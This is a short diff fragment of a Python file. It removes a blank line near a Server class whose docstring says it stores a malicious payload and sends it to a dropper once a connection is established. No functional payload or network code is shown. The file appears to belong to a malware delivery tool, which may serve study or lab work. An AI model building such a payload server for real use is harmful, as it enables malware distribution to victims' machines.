@@ -8,7 +8,6 @@ import base64
 import logging
 import socket
 
-
 class Server:
     """ This class represents a server that stores some malicious payload and sends
     it to the dropper once the connection is established.
